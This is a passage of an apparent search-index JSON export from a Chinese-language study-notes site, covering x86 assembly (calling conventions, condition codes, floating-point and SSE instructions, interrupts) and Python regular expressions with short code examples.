\u9700\u8bb0\u5f55\u4e0b\u6d6e\u70b9\u53c2\u6570\u7684\u4e2a\u6570\u3002</li> <li>call<ul> <li>\u5c06 rip \u538b\u5165\u6808</li> </ul> </li> </ul> <p>callee rules:</p> <ul> <li>\u4fdd\u5b58 caller \u5e27\u7684\u57fa\u5740\u5bc4\u5b58\u5668%rbp\uff1apush %rbp</li> <li>\u8c03\u6574 rbp \u6307\u5411\u5f53\u524d\u5e27\uff0cmovq %rsp, %rbp</li> <li>\u5206\u914d\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff0c\u901a\u8fc7\u8c03\u6574 esp</li> <li>\u53ef\u4ee5\u53d1\u73b0\u7b2c\u4e00\u4e2a\u53c2\u6570\u4f4d\u4e8e ebp+8 \u7684\u4f4d\u7f6e(x86-32)</li> </ul> <ul> <li>\u4fdd\u5b58 callee save \u5bc4\u5b58\u5668 (if use)\uff1a%rbx, %rsi, %rdi, %rbp, %rsp, and %r12-%r15</li> <li>\u8fd4\u56de\u503c\u5b58\u50a8\u5728 %eax \u4e2d\u3002</li> <li>\u6062\u590d callee save \u5bc4\u5b58\u5668\uff08\u5f39\u6808\uff09</li> <li>\u53d6\u6d88\u5206\u914d\u7684\u5c40\u90e8\u53d8\u91cf</li> <li>\u6062\u590d%rbp</li> <li>ret</li> </ul> <p></p> <p>enter, leave \u5408\u5e76\u90e8\u5206\u64cd\u4f5c</p> <ul> <li>\u51fd\u6570\u5f00\u5934\uff1apush ebp; mov ebp, esp; \u5206\u914d\u5c40\u90e8\u53d8\u91cf\u7a7a\u95f4\uff1b\u53ef\u4ee5\u901a\u8fc7 enter a b \u5b9e\u73b0\u3002a \u4e3a\u5206\u914d\u7684\u5b57\u8282\u6570\uff0cb \u4e3a\u5d4c\u5957\u7ea7\u522b\uff0c\u901a\u5e38\u4e3a 0\u3002</li> <li>\u51fd\u6570\u7ed3\u5c3e\uff1amov esp, ebp; pop ebp\uff0c\u53ef\u4ee5\u4f7f\u7528 leave \u4ee3\u66ff\u3002</li> </ul> <p>RISC \u4e2d\u6ca1\u7528\u4e13\u95e8\u7684\u51fd\u6570\u8c03\u7528\u6307\u4ee4\uff0c\u800c\u662f\u4f7f\u7528\u5206\u652f\u8df3\u8f6c\u6307\u4ee4\u8fdb\u884c\u8c03\u7528\u548c\u8fd4\u56de\uff0c\u5982 MIPS \u4e2d\uff1abeqal func, jr $31</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u52a8\u6001\u94fe\u63a5","title":"\u52a8\u6001\u94fe\u63a5","text":"<ol> <li> <p>\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u751f\u6210\u7684\u8fc7\u7a0b\u3002  \u7f16\u8bd1\uff08\u9884\u5904\u7406\uff0c\u6c47\u7f16\uff09\uff0c\u94fe\u63a5\uff08\u9759\u6001\uff0c\u52a8\u6001\uff09</p> </li> <li> <p>\u53ef\u6267\u884c\u6587\u4ef6\u6267\u884c\u7684\u8fc7\u7a0b  \u521b\u5efa\u8fdb\u7a0b (fork, exec)  loader\uff08\u9759\u6001\uff0c\u52a8\u6001\uff09</p> </li> <li> <p>\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u54ea\u91cc\u4f1a\u51fa\u73b0\u7edd\u5bf9\u5730\u5740</p> </li> </ol> <ul> <li>MIPS<ul> <li>PC-relative<ul> <li>beq, beqal</li> <li>b label (pseudo instruction)</li> </ul> </li> <li>indirect<ul> <li>jr\uff1aonly used in call-return</li> </ul> </li> <li>pseudo-immediate<ul> <li>j</li> </ul> </li> </ul> </li> <li>x86<ul> <li>jmp</li> <li>call\uff08\u5b9e\u9645\u662f\u76f8\u5bf9\u504f\u79fb\uff09</li> </ul> </li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#csapp-x86-\u6c47\u7f16","title":"CSAPP x86 \u6c47\u7f16","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#x86-\u6307\u4ee4-reference-\u7f51\u9875","title":"x86 \u6307\u4ee4 reference \u7f51\u9875","text":"<p>x86 \u6307\u4ee4 ref\uff1ax86 and amd64 instruction reference (felixcloutier.com)</p> <p>\u683c\u5f0f\u542b\u4e49</p> <ul> <li>MOV r/m8,r8<ul> <li>r8 \u8868\u793a\u5927\u5c0f\u4e3a 8 \u4f4d\u7684\u5bc4\u5b58\u5668</li> <li>m8 \u8868\u793a\u5927\u5c0f\u4e3a 8 \u4f4d\u7684\u64cd\u4f5c\u6570\u5bf9\u5e94\u7684\u5730\u5740</li> <li>imm \u8868\u793a\u7acb\u5373\u6570</li> </ul> </li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6570\u636e\u683c\u5f0f","title":"\u6570\u636e\u683c\u5f0f","text":"<ul> <li>x86_64 \u4e2d\uff0clong \u7c7b\u578b\u662f 8 \u5b57\u8282\u3002</li> <li>x86 \u5904\u7406\u5668\u66fe\u5b9e\u73b0\u8fc7\u5bf980 \u4f4d\u6d6e\u70b9\u6570\u7684\u5168\u5957\u6d6e\u70b9\u8fd0\u7b97\uff0c\u5728 C \u4e2d\u53ef\u4ee5\u4f7f\u7528 long double \u58f0\u660e\u3002\u4e0d\u63a8\u8350\u4f7f\u7528\u3002Double Extended Precision</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6570\u636e\u79fb\u52a8\u6307\u4ee4","title":"\u6570\u636e\u79fb\u52a8\u6307\u4ee4","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#mov-movz-movs","title":"mov, movz, movs","text":"<ul> <li>movl \u4f1a\u5c06\u5bc4\u5b58\u5668\u9ad8 32 \u4f4d\u6e05 0\uff0c\u56e0\u6b64\u4ee3\u66ff\u4e86 movzlq</li> <li>movabsq \u7528\u4e8e 64 \u4f4d\u7acb\u5373\u6570 mov</li> <li>cltq \u662f movslq %eax, %rax</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#cltdalias","title":"cltd(alias)","text":"<p><code>cltd</code> is an alias for <code>cdq</code> (reference), which sign-extends <code>eax</code> into <code>edx:eax</code>.</p> <p>What this means in practice is that <code>edx</code> is filled with the most significant bit of <code>eax</code> (the sign bit). For example, if <code>eax</code> is <code>0x7F000000</code> <code>edx</code> would become <code>0x00000000</code> after <code>cdq</code>. And if <code>eax</code> is <code>0x80000000</code> <code>edx</code> would become <code>0xFFFFFFFF</code>.</p> <p></p> <p></p> <p></p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u7b97\u672f\u548c\u903b\u8f91\u64cd\u4f5c","title":"\u7b97\u672f\u548c\u903b\u8f91\u64cd\u4f5c","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#lea","title":"lea","text":"<ul> <li>lea\uff08\u52a0\u8f7d\u6709\u6548\u5730\u5740\uff08load effective address)\uff09\u53ef\u4ee5\u7528\u6765\u6267\u884c\u7b80\u5355\u7684\u7b97\u672f\u64cd\u4f5c</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#128-\u4f4d\u4e58\u9664\u6cd5","title":"128 \u4f4d\u4e58\u9664\u6cd5","text":"<ul> <li>\u516b\u5b57 (oct word)\uff0co \u4e3a\u540e\u7f00</li> <li>\u4e0a\u9762\u7684 imulq\uff0c\u53cc\u64cd\u4f5c\u6570\uff1a\u5c06\u4e24\u4e2a 64 \u4f4d\u64cd\u4f5c\u6570\u4ea7\u751f\u4e00\u4e2a 64 \u4f4d\u4e58\u79ef\uff08\u622a\u65ad\u65f6\uff0c\u65e0\u7b26\u53f7\u4e58\u548c\u8865\u7801\u4e58\u7684\u4f4d\u7ea7\u884c\u4e3a\u662f\u4e00\u6837\u7684\uff09</li> <li>idivq \u65f6\uff0crdx: rax \u5206\u522b\u5b58\u4f59\u6570\u548c\u5546\u3002</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u63a7\u5236","title":"\u63a7\u5236","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6761\u4ef6\u7801","title":"\u6761\u4ef6\u7801","text":"<ul> <li>CF: \u8fdb\u4f4d\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u4f7f\u6700\u9ad8\u4f4d\u4ea7\u751f\u4e86\u8fdb\u4f4d\u3002\u53ef\u7528\u6765\u68c0\u67fb\u65e0\u7b26\u53f7\u64cd\u4f5c\u7684\u6ea2\u51fa\u3002</li> <li>ZF: \u96f6\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u51fa\u7684\u7ed3\u679c\u4e3a 0\u3002</li> <li>SF: \u7b26\u53f7\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5f97\u5230\u7684\u7ed3\u679c\u4e3a\u8d1f\u6570\u3002</li> <li>OF: \u6ea2\u51fa\u6807\u5fd7\u3002\u6700\u8fd1\u7684\u64cd\u4f5c\u5bfc\u81f4\u4e00\u4e2a\u8865\u7801\u6ea2\u51fa\u2014\u2014 \u6b63\u6ea2\u51fa\u6216\u8d1f\u6ea2\u51fa\u3002</li> </ul> <p>leaq \u6307\u4ee4\u4e0d\u6539\u53d8\u4efb\u4f55\u6761\u4ef6\u7801\uff0c\u56e0\u4e3a\u5b83\u662f\u7528\u6765\u8fdb\u884c\u5730\u5740\u8ba1\u7b97\u7684\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u56fe 3-10 \u4e2d \u5217\u51fa\u7684\u6240\u6709\u6307\u4ee4\u90fd\u4f1a\u8bbe\u7f6e\u6761\u4ef6\u7801\u3002\u5bf9\u4e8e\u903b\u8f91\u64cd\u4f5c\uff0c\u4f8b\u5982 XOR\u00ff \u8fdb\u4f4d\u6807\u5fd7\u548c\u6ea2\u51fa\u6807\u5fd7\u4f1a\u8bbe \u7f6e\u6210 \u3007\u3002\u5bf9\u4e8e\u79fb\u4f4d\u64cd\u4f5c\uff0c\u8fdb\u4f4d\u6807\u5fd7\u5c06\u8bbe\u7f6e\u4e3a\u6700\u540e\u4e00\u4e2a\u88ab\u79fb\u51fa\u7684\u4f4d\uff0c\u800c\u6ea2\u51fa\u6807\u5fd7\u8bbe\u7f6e\u4e3a 0\u3002 INC \u548c DEC \u6307\u4ee4\u4f1a\u8bbe\u7f6e\u6ea2\u51fa\u548c\u96f6\u6807\u5fd7\uff0c\u4f46\u662f\u4e0d\u4f1a\u6539\u53d8\u8fdb\u4f4d\u6807\u5fd7\uff0c\u81f3\u4e8e\u539f\u56e0\uff0c\u6211\u4eec\u5c31\u4e0d\u5728 \u8fd9\u91cc\u6df1\u4eba\u63a2\u8ba8\u4e86\u3002</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#cmp-test","title":"cmp, test","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#set","title":"set","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#jmp-\u7684-pc-\u76f8\u5bf9\u5bfb\u5740","title":"jmp \u7684 PC \u76f8\u5bf9\u5bfb\u5740","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u51fd\u6570\u8c03\u7528_1","title":"\u51fd\u6570\u8c03\u7528","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u57fa\u6307\u9488\u4f5c\u7528","title":"\u57fa\u6307\u9488\u4f5c\u7528","text":"<p>\u53d8\u957f\u6808\u5e27\u3002\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u6808\u5e27\u7684\u5927\u5c0f\u5728\u7f16\u8bd1\u65f6\u5373\u53ef\u786e\u5b9a\u3002\u4f46\u662f\u5bf9\u4e8e alloca \u6807\u51c6\u5e93\u51fd\u6570\uff0c\u53d8\u957f\u6570\u7ec4\uff08int p[n]\uff09\uff0c\u6808\u5e27\u5927\u5c0f\u662f\u53d8\u5316\u7684\u3002</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u4f53\u7cfb\u7ed3\u6784","title":"\u6d6e\u70b9\u4f53\u7cfb\u7ed3\u6784","text":"<ul> <li>MMX</li> <li>SSE</li> <li>AVX<ul> <li>AVX2:2013 \u5e74 Core i7 Haswell \u5f15\u5165</li> <li>GCC \u4f7f\u7528-mavx2</li> </ul> </li> </ul> <p>2000 \u5e74 Pentium 4 \u4e2d\u5f15\u5165\u4e86 SSE2\u3002\u5a92\u4f53\u6307\u4ee4\u5f00\u59cb\u5305\u62ec\u90a3\u4e9b\u5bf9\u6807\u91cf\u6d6e\u70b9\u6570\u636e\u8fdb\u884c\u64cd\u4f5c\u7684\u6307\u4ee4\uff0c\u4f7f\u7528 XMM \u6216 YMM \u5bc4\u5b58\u5668\u7684\u4f4e 32 \u4f4d\u6216 64 \u4f4d\u4e2d\u7684\u5355\u4e2a\u503c\u3002\u8fd9\u4e2a\u6807\u91cf\u6a21\u5f0f\u63d0\u4f9b\u4e86\u4e00\u7ec4\u5bc4\u5b58\u5668\u548c\u6307\u4ee4\uff0c\u5b83\u4eec\u66f4\u7c7b\u4f3c\u4e8e\u5176\u4ed6\u5904\u7406\u5668\u652f\u6301\u6d6e\u70b9\u6570\u7684\u65b9\u5f0f\u3002\u6240\u6709\u80fd\u591f\u6267\u884c X86-64 \u4ee3\u7801\u7684\u5904\u7406\u5668\u90fd\u652f\u6301 SSE2 \u6216\u66f4\u9ad8\u7684\u7248\u672c\uff0c\u56e0\u6b64 X86-64 \u6d6e\u70b9\u6570\u662f\u57fa\u4e8e SSE \u6216 AVX \u7684\uff0c\u5305\u62ec\u4f20\u9012\u8fc7\u7a0b\u53c2\u6570\u548c\u8fd4\u56de\u503c\u7684\u89c4\u5219[77]\u3002</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u6570\u636e\u4f20\u9001\u6307\u4ee4","title":"\u6d6e\u70b9\u6570\u636e\u4f20\u9001\u6307\u4ee4","text":"<ul> <li>GCC \u53ea\u7528\u6807\u91cf\u4f20\u9001\u64cd\u4f5c\u4ece\u5185\u5b58\u4f20\u9001\u6570\u636e\u5230 XMM \u5bc4\u5b58\u5668\u6216\u4ece XMM \u5bc4\u5b58\u5668\u4f20\u9001\u6570\u636e\u5230\u5185\u5b58\u3002</li> <li>\u5728\u4e24\u4e2a XMM \u5bc4 \u5b58\u5668\u4e4b\u95f4\u4f20\u9001 \u6570\u636e\u65f6\uff0cGCC \u4f7f\u7528 vmovaps \u4f20\u9001\u5355\u7cbe\u5ea6\u6570\uff0c\u7528 vtnovapd \u4f20\u9001\u53cc\u7cbe\u5ea6\u6570\uff08\u5bf9\u4e8e\u8fd9\u4e9b\u60c5\u51b5\uff0c\u7a0b\u5e8f\u590d\u5236\u6574\u4e2a\u5bc4\u5b58\u5668\u8fd8\u662f\u53ea\u590d\u5236\u4f4e\u4f4d\u503c\u65e2\u4e0d\u4f1a\u5f71\u54cd\u7a0b\u5e8f\u529f\u80fd\uff0c\u4e5f\u4e0d\u4f1a\u5f71\u54cd\u6267\u884c\u901f\u5ea6\uff09</li> <li>\u63a8\u6d4b vmovss \u7684 s \u5206\u522b\u8868\u793a scal</li> <li>ar \u6807\u91cf\u548c\u5355\u7cbe\u5ea6\uff0ca \u8868\u793a aligned, p \u8868\u793a packed</li> </ul> <p>\u56fe 3-47 \u548c\u56fe 3-48 \u7ed9\u51fa\u4e86\u5728\u6d6e\u70b9\u6570\u548c\u6574\u6570\u6570\u636e\u7c7b\u578b\u4e4b\u95f4\u4ee5\u53ca\u4e0d\u540c\u6d6e\u70b9\u683c\u5f0f\u4e4b\u95f4\u8fdb\u884c\u8f6c\u6362\u7684\u6307\u4ee4\u96c6\u5408\u3002</p> <p></p> <ul> <li>\u6700\u540e\u7684\u4e24\u884c\u65f6 GCC \u5728 float \u548c double \u95f4\u8f6c\u6362\u7684\u4ee3\u7801\uff0c\u6ca1\u6709\u4f7f\u7528\u57fa\u672c\u7684 vctsd2ss\uff08\u6709\u6ca1\u6709\u8fd9\u6761\u6307\u4ee4\u5462\uff1f\uff09</li> </ul> <p></p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u51fd\u6570\u8c03\u7528","title":"\u6d6e\u70b9\u51fd\u6570\u8c03\u7528","text":"<ul> <li>XMM \u5bc4\u5b58\u5668\uff05xmm_0~\uff05xmm_7 \u6700\u591a\u53ef\u4ee5\u4f20\u9012 8 \u4e2a\u6d6e\u70b9\u53c2\u6570\u3002\u6309\u7167\u53c2\u6570\u5217\u51fa\u7684\u987a\u5e8f\u4f7f\u7528\u8fd9\u4e9b\u5bc4\u5b58\u5668\u3002\u53ef\u4ee5\u901a\u8fc7\u6808\u4f20\u9012\u989d\u5916\u7684\u6d6e\u70b9\u53c2\u6570</li> <li>\u51fd\u6570\u4f7f\u7528\u5bc4\u5b58\u5668\uff05xmm_0 \u6765\u8fd4\u56de\u6d6e\u70b9\u503c\u3002</li> <li>\u6709\u7684 XMM \u5bc4\u5b58\u5668\u90fd\u662f\u8c03\u7528\u8005\u4fdd\u5b58\u7684\u3002\u88ab\u8c03\u7528\u8005\u53ef\u4ee5\u4e0d\u7528\u4fdd\u5b58\u5c31\u8986\u76d6\u8fd9\u4e9b\u5bc4\u5b58\u5668\u4e2d\u4efb\u610f\u4e00\u4e2a\u3002</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6d6e\u70b9\u8fd0\u7b97\u64cd\u4f5c","title":"\u6d6e\u70b9\u8fd0\u7b97\u64cd\u4f5c","text":"<ul> <li>\u6d6e\u70b9\u8fd0\u7b97\u6307\u4ee4\u65e0\u6cd5\u4f7f\u7528\u7acb\u5373\u6570\u3002\u7f16\u8bd1\u5668\u5fc5\u987b\u4e3a\u6240\u6709\u7684\u5e38\u91cf\u503c\u5206\u914d\u548c\u521d\u59cb\u5316\u5b58\u50a8\u7a7a\u95f4</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u4f4d\u7ea7\u64cd\u4f5c","title":"\u4f4d\u7ea7\u64cd\u4f5c","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u6bd4\u8f83","title":"\u6bd4\u8f83","text":"<ul> <li>\u6d6e\u70b9\u6bd4\u8f83\u6307\u4ee4\u4f1a\u8bbe\u7f6e\u4e09\u4e2a\u6761\u4ef6\u7801\uff1a\u96f6\u6807\u5fd7\u4f4d ZF\uff0c\u8fdb\u4f4d\u6807\u5fd7\u4f4d CF \u548c\u5947\u5076\u6807\u5fd7\u4f4d PF<ul> <li>\u5bf9\u4e8e\u6d6e\u70b9\u6bd4\u8f83\uff0c\u5f53\u4e24\u4e2a\u64cd\u4f5c\u6570\u4e2d\u4efb\u4e00\u4e2a\u662f NaN \u65f6\uff0c\u4f1a\u8bbe\u7f6e PF \u4f4d\u3002</li> <li>\u5f53 x \u4e3a NaN \u65f6\uff0c\u6bd4\u8f83 x==x \u4f1a\u5f97\u5230 0</li> </ul> </li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#x86-\u624b\u518c","title":"x86 \u624b\u518c","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5185\u5b58\u7ba1\u7406","title":"\u5185\u5b58\u7ba1\u7406","text":"","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u5206\u6bb5\u5f0f\u7ba1\u7406","title":"\u5206\u6bb5\u5f0f\u7ba1\u7406","text":"<ul> <li>\u6bb5\u9009\u62e9\u5b50\uff1a\u7528\u4e8e\u67e5\u627e GDT\uff0c\u627e\u5230\u6bb5\u7684\u57fa\u5730\u5740</li> </ul>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/19/2022-09-19-x86%E5%AD%A6%E4%B9%A0/#\u4e2d\u65ad\u5904\u7406","title":"\u4e2d\u65ad\u5904\u7406","text":"<ul> <li>\u4e2d\u65ad\u7c7b\u578b\u3002\u51e0\u79cd\u4e0d\u540c\u7684\u8bf4\u6cd5\uff0c\u542b\u4e49\u662f\u4e00\u6837\u7684<ul> <li>\u5916\u90e8\u4e2d\u65ad\uff0c\u5185\u90e8\u4e2d\u65ad</li> <li>\u5f02\u6b65\u4e2d\u65ad\uff0c\u540c\u6b65\u4e2d\u65ad</li> <li>\u4e2d\u65ad\uff0c\u5f02\u5e38</li> </ul> </li> <li>\u4e2d\u65ad\u63cf\u8ff0\u7b26</li> <li>\u4e2d\u65ad\u63cf\u8ff0\u7b26\u8868 IDT, IDTR</li> </ul> <p>\u4e2d\u65ad\u4e0a\u4e0b\u6587\u5207\u6362\u8fc7\u7a0b</p>","tags":["x86"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/","title":"python \u6b63\u5219\u8868\u8fbe\u5f0f","text":"<p>python \u6b63\u5219\u8868\u8fbe\u5f0f</p> <ul> <li>re \u2014 Regular expression operations \u2014 Python 3.9.5 documentation</li> <li>Regular Expression HOWTO \u2014 Python 3.9.5 documentation</li> </ul> <ol> <li>re \u662f python \u7684\u6807\u51c6\u5e93\uff0c\u4f4d\u4e8e<code>Lib/re.py</code></li> <li>regex \u8868\u793a regular expression\u3002\u6b63\u5219\u8868\u8fbe\u5f0f\u4f1a\u88ab\u7f16\u8bd1\u6210\u4e00\u4e2a\u5b57\u8282\u7801\uff0cpython \u5e95\u5c42\u8c03\u7528 C \u7f16\u5199\u7684\u6b63\u5219\u5f15\u64ce\u6267\u884c\u8be5\u5b57\u8282\u7801\u3002\u53ef\u4ee5\u4f18\u5316\u6b63\u5219\u8868\u8fbe\u5f0f\u7684\u4e66\u5199\uff0c\u4ece\u800c\u4f7f\u5f97\u5b57\u8282\u7801\u7684\u6267\u884c\u901f\u5ea6\u66f4\u5feb\u3002</li> </ol>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#quick-reference","title":"quick reference","text":"<pre><code>RE = r'pattern'\nre_obj = re.compile(RE)\n\n#regex obj or re.(RE, ..)\nmatch\nsearch\nfindall   #return string list, not match obj\nfiniter\n\nsplit\nsub       #\u66ff\u6362\nsubn\n\n#match obj\ngroup    #group(0) \u8fd4\u56de\u5339\u914d\u7684\u6574\u4e2a\u5b57\u7b26\u4e32\uff0cgroup(1) \u8fd4\u56de\u7b2c\u4e00\u4e2a group\ngroupdict\nstart\nend\n</code></pre> <ul> <li><code>m.span([group])</code><ul> <li>\u9ed8\u8ba4 group \u4e3a 0\uff0c\u5373\u6574\u4e2a\u5339\u914d</li> <li>\u8fd4\u56de (m.start(group),\u00a0m.end(group))</li> <li>if\u00a0group\u00a0did not contribute to the match, this is\u00a0<code>(-1,\u00a0-1)</code></li> </ul> </li> </ul>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#example","title":"example","text":"<p>match \u8fd4\u56de match object</p> <pre><code>import re\n\npattern = '^a...s$'\ntest_string = 'abyss'\nresult = re.match(pattern, test_string)\n\nif result:\n  print(\"Search successful.\")\nelse:\n  print(\"Search unsuccessful.\") \n</code></pre> <p>findall \u8fd4\u56de\u5b57\u7b26\u4e32\u5217\u8868</p> <pre><code># Program to extract numbers from a string\n\nimport re\n\nstring = 'hello 12 hi 89. Howdy 34'\npattern = '\\d+'\n\nresult = re.findall(pattern, string) \nprint(result)\n\n# Output: ['12', '89', '34']\n</code></pre>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#group","title":"group","text":"<p><code>(...)</code> \u5339\u914d\u751f\u6210\u4e00\u4e2a group\u3002\u5e76\u4e14\u53ef\u4ee5\u5728\u540e\u9762\u7684\u5b57\u7b26\u4e32\u4e2d\u4f7f\u7528<code>\\number</code>\u5f15\u7528</p> <p><code>(?...)</code></p> <ul> <li><code>(?:...)</code>\uff1anon-capturing\uff0c\u4ea7\u751f\u7684 group \u76f8\u5f53\u4e8e\u4f1a\u88ab\u5ffd\u7565</li> <li><code>(?P&lt;key&gt;...)</code>\uff1a\u4ea7\u751f\u4e00\u4e2a\u547d\u540d group\uff0c\u901a\u8fc7 goup</li> </ul>","tags":["python","re"]},{"location":"%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2022/09/28/2022-09-28-python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/#reference-group","title":"reference group","text":"<ul> <li>\u53ef\u4ee5\u5728\u5b9a\u4e49 pattern \u65f6\u5f15\u7528 group \u5185\u5bb9</li> <li>\u53ef\u4ee5\u5728\u5339\u914d\u7684 match object \u91cc\u83b7\u53d6 group</li> <li>\u53ef\u4ee5\u5728 sub \u66ff\u6362\u51fd\u6570\u4e2d\uff0c\u5f15\u7528 group \u4f5c\u4e3a\u66ff\u4ee3\u5b57\u7b26\u4e32</li> </ul> Context of reference to group \u201cquote\u201d Ways to reference it in the same pattern itself - <code>(?P=quote)</code>\u00a0(as shown) - <code>\\1</code> when processing match object\u00a0m - <code>m.group('quote')</code> - <code>m.end('quote')</code>\u00a0(etc.) in a string passed to the\u00a0repl\u00a0argument of\u00a0<code>re.sub()</code> - <code>\\g&lt;quote&gt;</code> - <code>\\g&lt;1&gt;</code> - <code>\\1</code> example <ul> <li>\u5339\u914d\u4e00\u4e2a\u88ab\u5f15\u53f7\u62ec\u8d77\u6765\u7684\u5b57\u7b26\u4e32\uff1a<code>(?P&lt;quote&gt;['\"]).*?(?P=quote)</code></li> <li>\u66ff\u6362\u6389\u5339\u914d\u7684 group\uff0c\u65b0\u503c\u5f15\u7528\u4e86 group</li> </ul> <pre><code>import re\n\n# \u793a\u4f8b\u5b57\u7b26\u4e32\ntext = \"Name: John, Age: 30, City: New York\"\n\n# \u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u5339\u914d Name \u548c Age\uff0c\u5e76\u66ff\u6362\u4e3a\u65b0\u7684\u503c\nresult = re.sub(r\"(Name: )(\\w+), (Age: )(\\d+)\", r\"\\1Alice, \\325\", 